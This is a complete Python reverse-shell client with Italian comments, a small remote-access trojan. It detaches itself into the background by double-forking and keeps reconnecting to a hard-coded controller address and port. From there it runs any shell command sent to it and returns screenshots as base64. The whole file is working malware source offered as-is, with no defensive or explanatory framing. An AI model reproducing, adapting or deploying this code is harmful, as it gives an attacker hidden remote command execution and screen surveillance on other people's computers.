#!/usr/bin/env python3
import socket
import subprocess
import time
import os
import sys
import base64
import io

# OPTIONAL: pyautogui può non essere disponibile ovunque
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except Exception:
    PYAUTOGUI_AVAILABLE = False

SERVER_IP = '192.168.1.6'  # cambia se necessario
SERVER_PORT = 5666


def daemonize():
    """Run in background (double-fork). Linux/Unix only."""
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Fork failed: {e}")
        sys.exit(1)

    os.setsid()

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Second fork failed: {e}")
        sys.exit(1)


def capture_screenshot_bytes():
    """Cattura lo screenshot e ritorna i bytes PNG (non codificati)."""
    if not PYAUTOGUI_AVAILABLE:
        return None
    try:
        screenshot = pyautogui.screenshot()
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        buffer.seek(0)
        return buffer.read()
    except Exception:
        return None


def send_screenshot_protocol(sock):
    """
    Cattura screenshot, codifica in base64 e invia con header:
    SCREENSHOT|<length>\n<base64 bytes>
    Invia i dati in chunk per evitare problemi con grandi payload.
    """
    img_bytes = capture_screenshot_bytes()
    if img_bytes is None:
        err = "Error: unable to capture screenshot or pyautogui not available"
        try:
            sock.send(err.encode('utf-8'))
        except Exception:
            pass
        return

    encoded = base64.b64encode(img_bytes)  # bytes
    length = len(encoded)
    header = f"SCREENSHOT|{length}\n".encode('utf-8')
    try:
        sock.sendall(header)
        # invia in chunk
        CHUNK = 4096
        sent = 0
        while sent < length:
            chunk = encoded[sent:sent+CHUNK]
            sock.sendall(chunk)
            sent += len(chunk)
    except Exception as e:
        try:
            sock.send(f"Error: {e}".encode('utf-8'))
        except Exception:
            pass


def execute_shell_command(command, cwd):
    """Esegue comando shell nella cwd e ritorna output str."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=cwd)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"


def connect_to_server():
    current_dir = os.getcwd()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            # Optional: invia una stringa di benvenuto
            # s.send(f"HELLO|{os.getlogin()}\n".encode('utf-8'))
            while True:
                command = s.recv(4096).decode('utf-8', errors='ignore')
                if not command:
                    break

                cmd_stripped = command.strip()
                if cmd_stripped.lower() == "screenshot":
                    send_screenshot_protocol(s)
                    continue

                if cmd_stripped.startswith("cd "):
                    path = cmd_stripped[3:].strip()
                    try:
                        os.chdir(path)
                        current_dir = os.getcwd()
                        output = ""
                    except Exception as e:
                        output = f"Error: {e}"
                else:
                    output = execute_shell_command(command, current_dir)

                try:
                    if isinstance(output, str):
                        s.sendall(output.encode('utf-8'))
                    else:
                        s.sendall(str(output).encode('utf-8'))
                except Exception:
                    break

        except Exception as e:
            # Connessione fallita: attendi e riprova
            time.sleep(5)
        finally:
            try:
                s.close()
            except Exception:
                pass


if __name__ == "__main__":
    # Se vuoi eseguire in background (Unix), decommenta la riga sotto:
    daemonize()
    connect_to_server()
